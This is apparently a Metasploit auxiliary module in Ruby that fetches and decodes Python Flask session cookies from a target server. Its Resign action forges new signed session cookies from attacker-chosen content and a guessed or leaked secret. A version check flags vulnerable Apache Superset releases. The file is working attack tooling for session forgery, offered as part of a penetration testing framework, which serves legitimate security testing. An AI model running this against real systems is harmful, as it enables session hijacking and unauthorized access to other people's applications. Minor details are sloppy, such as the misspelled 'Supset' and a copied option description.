##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Python Flask Cookie Signer',
        'Description' => %q{
          This is a generic module which can manipulate Python Flask based application cookies.
          The action Retrieve will connect to a web server, grab the cookie, and decode it.
          The action Resign will do the same as above, but after decoding it, it will replace
          the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This
          cookie can then be used in a browser. This is a ruby based implementation of some
          of the features in the python project Flask-Unsign.
        },
        'Author' => [
          'h00die', # MSF module
          'paradoxis', #  original flask-unsign tool
          'Spencer McIntyre', # MSF flask-unsign library
        ],
        'References' => [
          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Actions' => [
          ['Retrieve', { 'Description' => 'Retrieve a cookie from an HTTP(s) server' }],
          ['Resign', { 'Description' => 'Retrieve, Alter and Resign a cookie' }]
        ],
        'DefaultAction' => 'Retrieve',
        'DisclosureDate' => '2019-01-26' # first commit by @Paradoxis to the Flask-Unsign repo
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'URI to browse', '/']),
        OptString.new('NEWCOOKIECONTENT', [ false, 'Content of a cookie to sign', '']),
        OptString.new('SECRET', [ false, 'Content of a cookie to sign', '']),
      ]
    )
  end

  def check
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path)
    })
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Unknown("#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
    return Exploit::CheckCode::Safe("#{peer} - Unexpected response, version_string not detected") unless res.body.include? 'version_string'
    unless res.body =~ /&#34;version_string&#34;: &#34;([\d.]+)&#34;/
      return Exploit::CheckCode::Safe("#{peer} - Unexpected response, unable to determine version_string")
    end

    version = Rex::Version.new(Regexp.last_match(1))
    if version < Rex::Version.new('2.0.1') && version >= Rex::Version.new('1.4.1')
      Exploit::CheckCode::Vulnerable("Apache Supset #{version} is vulnerable")
    else
      Exploit::CheckCode::Safe("Apache Supset #{version} is NOT vulnerable")
    end
  end

  def retrieve
    print_status("#{peer} - Retrieving Cookie")
    res = send_request_cgi!({
      'uri' => normalize_uri(target_uri.path),
      'keep_cookies' => true
    })
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
    cookie = res.get_cookies.to_s
    print_status("#{peer} - Initial Cookie: #{cookie}")
    Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie.split('=')[1].gsub(';', ''))
  end

  def run
    case action.name
    when 'Retrieve'
      decoded_cookie = retrieve
      print_good("#{peer} - Decoded Cookie: #{decoded_cookie}")
      return
    when 'Resign'
      print_status("Attempting to sign with key: #{datastore['SECRET']}")
      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(datastore['NEWCOOKIECONTENT'], datastore['SECRET'])
      print_good("#{peer} - New signed cookie: #{encoded_cookie}")
    end
  end
end
